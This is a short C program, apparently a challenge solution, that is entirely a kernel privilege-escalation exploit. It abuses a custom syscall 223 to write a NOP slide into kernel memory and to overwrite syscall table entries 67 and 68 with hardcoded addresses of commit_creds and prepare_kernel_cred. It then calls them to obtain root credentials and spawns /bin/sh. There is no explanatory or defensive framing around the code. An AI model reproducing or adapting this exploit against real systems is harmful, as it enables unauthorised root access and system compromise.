#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#define UPPER_SYSCALL 223
unsigned int** sct = (unsigned int**)0x8000e348;

int main()
{
      
      char* slide = "\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1";
      syscall(UPPER_SYSCALL, slide , (0x8003f56c - 12) ); // inserting the nop slide
      syscall(UPPER_SYSCALL,"\x60\xf5\x03\x80", &sct[67] ); //commit_cred into syscall at sct+67
      
      syscall(UPPER_SYSCALL,"\x24\xf9\x03\x80", &sct[68] ); //prepare_kernel_cred into the syscall at sct+68
      
      syscall(67,syscall(68,0)); //67 is overwritten with commit_cred and 68 is overwritten with prepare_kernel_cred
      
      system("/bin/sh");
      return 0;
}



